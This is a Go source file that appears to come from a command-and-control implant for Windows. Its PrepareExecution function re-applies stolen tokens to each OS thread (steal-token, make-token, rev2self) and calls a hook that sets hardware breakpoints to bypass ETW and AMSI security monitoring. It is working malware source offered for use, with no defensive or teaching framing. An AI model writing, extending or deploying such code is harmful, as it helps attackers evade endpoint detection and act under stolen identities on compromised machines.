//go:build windows
// +build windows

package commands

import "runtime"

// osThreadLocked tracks whether we've pinned the current goroutine to its OS
// thread via runtime.LockOSThread. This is necessary because Windows token
// impersonation (ImpersonateLoggedOnUser) is per-thread state, but Go's
// goroutine scheduler can migrate goroutines between OS threads. Without
// pinning, a steal-token followed by run/whoami may execute on different
// threads, silently losing the impersonation.
var osThreadLocked bool

// HWBP application function variable, to be set by main package
var ApplyHWBPToCurrentThread func()

// PrepareExecution re-applies token impersonation before each command.
// Called from main.go's processTaskWithAgent before command dispatch.
//
// If gIdentityToken is set (by steal-token or make-token):
//  1. Pin goroutine to current OS thread (LockOSThread)
//  2. Call ImpersonateLoggedOnUser to set the token on this thread
//
// This ensures every command sees the impersonated identity regardless
// of Go's goroutine scheduling.
//
// Also, it applies Hardware Breakpoints (HWBP) for ETW/AMSI bypass to the current OS thread.
func PrepareExecution() {
	// Apply HWBP to bypass ETW and AMSI on this thread
	if ApplyHWBPToCurrentThread != nil {
		ApplyHWBPToCurrentThread()
	}

	tokenMutex.Lock()
	token := gIdentityToken
	tokenMutex.Unlock()

	if token == 0 {
		return
	}

	// Pin goroutine to OS thread so impersonation sticks
	if !osThreadLocked {
		runtime.LockOSThread()
		osThreadLocked = true
	}

	// Re-apply impersonation on this thread
	procImpersonateLoggedOnUser.Call(uintptr(token))
}

// CleanupExecution is called after command dispatch. Currently a no-op
// because we want the OS thread lock to persist while impersonating.
// The lock is released by RevertCurrentToken (rev2self).
func CleanupExecution() {
	// Intentionally empty — thread stays locked while impersonating.
	// Unlock happens in RevertCurrentToken when rev2self is called.
}
